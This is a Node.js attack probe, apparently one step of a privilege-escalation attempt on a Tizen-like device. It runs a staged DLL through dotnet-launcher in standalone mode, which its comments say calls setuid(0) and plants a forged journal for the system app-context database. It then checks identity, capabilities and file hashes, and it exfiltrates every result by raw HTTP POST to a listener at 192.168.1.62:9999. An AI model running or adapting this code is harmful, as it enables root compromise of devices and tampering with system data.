"use strict";

/* p56: dotnet-launcher --standalone (interface decoded from binary)
   1. sanity: --version + which dlog + staged files
   2. standalone caps  : dotnet-launcher --standalone PLDIR/placer.dll caps
   3. standalone place : dotnet-launcher --standalone PLDIR/placer.dll place
   4. standalone dir   : dotnet-launcher --standalone PLDIR caps (dir variant)
   5. dlog capture of launcher messages (if dlog available)
   6. verify: dst md5 + live db md5 + staged md5 + error files
   exfil /p56info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var DL = '/usr/bin/dotnet-launcher';
var R = { ts: new Date().toISOString(), probe: 'p56', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p56info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function main() {
  R.results.identity = run('id 2>&1; echo ===SELF===; grep -E "Cap|Uid|EUid" /proc/self/status 2>/dev/null', 10000);

  // 1) sanity: --version + dlog + staged files
  R.results.sanity = run(
    DL + ' --version 2>&1; echo version_exit=$?; echo ===WHICH_DLOG===; which dlog 2>&1; echo which_dlog_exit=$?; ' +
    'echo ===STAGED===; ls -la ' + PLDIR + '/placer.dll ' + PLDIR + '/appctx_hot_journal 2>&1; ' +
    'md5sum ' + PLDIR + '/appctx_hot_journal 2>&1', 30000);

  // 2) standalone caps (in-process CoreCLR, prints uid/caps around setuid(0))
  R.results.s_caps = run(DL + ' --standalone ' + PLDIR + '/placer.dll caps 2>&1; echo s_caps_exit=$?', 90000);

  // 3) standalone place (setuid(0) + copy journal + chmod via default perms)
  R.results.s_place = run(DL + ' --standalone ' + PLDIR + '/placer.dll place 2>&1; echo s_place_exit=$?', 90000);

  // 4) directory variant (caps only, diagnostic)
  R.results.s_dir = run(DL + ' --standalone ' + PLDIR + ' caps 2>&1; echo s_dir_exit=$?', 90000);

  // 5) dlog capture of launcher messages (dlog daemon logs are invisible on stdout)
  R.results.dlog_cap = run(
    'which dlog >/dev/null 2>&1 && { dlog >/tmp/p56_dlog.txt 2>&1 & DPID=$!; sleep 1; ' +
    DL + ' --standalone ' + PLDIR + '/placer.dll caps >/tmp/p56_dlog_run.txt 2>&1; echo run_exit=$?; sleep 2; kill $DPID 2>/dev/null; }; ' +
    'echo ===RUN_OUT===; cat /tmp/p56_dlog_run.txt 2>/dev/null | head -30; ' +
    'echo ===DLOG_GREP===; grep -iE "dotnet|standalone|core|clr|fail|error|exist|launch|init|empty|assembly" /tmp/p56_dlog.txt 2>/dev/null | head -80; ' +
    'echo ===DLOG_TAIL===; tail -30 /tmp/p56_dlog.txt 2>/dev/null', 120000);

  // 6) verify
  R.results.verify = run(
    'echo ===DST===; ls -la /opt/dbspace/.app-context.db-journal 2>&1; md5sum /opt/dbspace/.app-context.db-journal 2>&1; ' +
    'echo ===DBSPACE===; ls -la /opt/dbspace/ 2>&1 | head -10; ' +
    'echo ===LIVE===; md5sum /opt/dbspace/.app-context.db 2>&1; ' +
    'echo ===STAGED===; md5sum ' + PLDIR + '/appctx_hot_journal 2>&1; ' +
    'echo ===ERR_AFTER===; ls -la /opt/usr/home/owner/share/ 2>&1 | grep -iE "dotnet|error"; cat /opt/usr/home/owner/share/dotnet_error.* 2>&1 | head -40', 20000);

  // 7) misc: dotnet_fixed marker + empty dotnet root dir
  R.results.misc = run('cat /opt/usr/home/owner/share/.dotnet_fixed 2>&1; echo ===SHARE_DOTNET===; ls -la /opt/usr/home/owner/share/dotnet/ 2>&1', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
